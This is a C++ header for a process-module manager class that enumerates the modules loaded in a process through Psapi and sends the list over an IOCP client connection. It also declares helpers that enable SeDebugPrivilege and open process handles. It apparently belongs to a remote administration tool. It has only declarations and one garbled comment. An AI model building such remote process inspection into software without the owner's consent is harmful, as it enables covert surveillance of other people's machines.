#pragma once
#include "Manager.h"
#include"Common.h"
#include<vector>
#include <Psapi.h>
#pragma comment(lib,"Psapi.lib")

typedef struct _MODULE_INFORMATION_
{
	MODULEINFO ModuleInfo;
	string     ModuleName;
}MODULE_INFORMATION, *PMODULE_INFORMATION;




class CProcessModuleManager :
	public CManager
{
public:
	CProcessModuleManager(_CIOCPClient * IOCPClient);

	~CProcessModuleManager();

	BOOL CProcessModuleManager::SendClientProcessModuleList();
	//ц╤╬ыпео╒
	BOOL CProcessModuleManager::EnumModuleInfoByProcessID(HANDLE ProcessID);
	BOOL CProcessModuleManager::EnumMoudleByPsapi(HANDLE ProcessHandle, vector<MODULE_INFORMATION>& ModuleInfo);
	BOOL  CProcessModuleManager::EnumMoudleByPsapiEx(HANDLE ProcessID, vector<MODULE_INFORMATION>& ModuleInfo);

	vector<MODULE_INFORMATION> m_ModuleItemInfoVector;
};

BOOL ModEnableSeDebugPrivilege(HANDLE ProcessHandle, BOOL IsEnable);
HANDLE ModOpenProcess(DWORD DesiredAccess, BOOL IsInheritHandle, HANDLE ProcessID);
BOOL ModCloseHandle(HANDLE HandleValue);
